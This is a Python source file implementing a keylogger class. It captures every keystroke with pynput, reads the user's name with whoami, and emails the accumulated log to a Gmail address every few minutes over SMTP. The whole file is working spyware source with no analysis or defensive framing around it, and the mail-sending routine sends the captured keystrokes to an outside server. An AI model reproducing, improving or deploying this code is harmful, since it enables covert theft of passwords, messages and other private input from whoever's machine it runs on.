import pynput, threading, subprocess, smtplib

class KeyLogger:
    '''
    keylogger class which can be extended to log keys
    and send report of log keys in few seconds time
    interval span.
    '''
    def __init__(self, email:str, password:str, interval_in_secs=300) -> None:
        self.log_no = 0
        self.email = email
        self.password = password
        self.interval = interval_in_secs
        self.username = self.get_username()
        self.set_subject()


    def set_subject(self):
        '''
        Sets the subject of the report mail.
        '''
        self.logs = f'Subject : Logs {self.log_no} from {self.username}\n\n'
        

    def send_mail(self)->bool:
        '''
        sends email from mail to itself.
        params: mail, password, message -> str
        retuns bool
        '''
        email = self.email 
        password = self.password
        message = self.logs
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587) 
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
            return True
        except smtplib.SMTPException as e:
            # print('[-] Exception : ', e)
            return False


    def get_username(self):
            '''
            returns username if detected else returns "Unkown User"
            '''
            username = subprocess.check_output('whoami', shell=True).decode()
            if username:
                return username
            else:
                return 'Unknown User'


    def append_to_logs(self, log:str):
        '''
        appends passed str to the logs.
        '''
        self.logs += log 


    def log_key(self, key):
        '''
        self.logs key pressed.
        '''
        try:
            log_key = str(key.char)

        except AttributeError:
            if key == key.space:
                log_key = ' '
            else:
                log_key = f' {str(key)} '

        finally:
            self.append_to_logs(log_key)


    def mail_report(self):
        '''
        mails the logged report after few seconds time interval.
        '''

        self.log_no += 1
        self.send_mail()
        self.set_subject()
        timer = threading.Timer(self.interval, self.mail_report)
        timer.start()
    

    def run(self):
        '''
        run/start the keylogger.
        '''
        key_listener = pynput.keyboard.Listener(on_press=self.log_key)

        with key_listener:
            self.mail_report()
            key_listener.join()
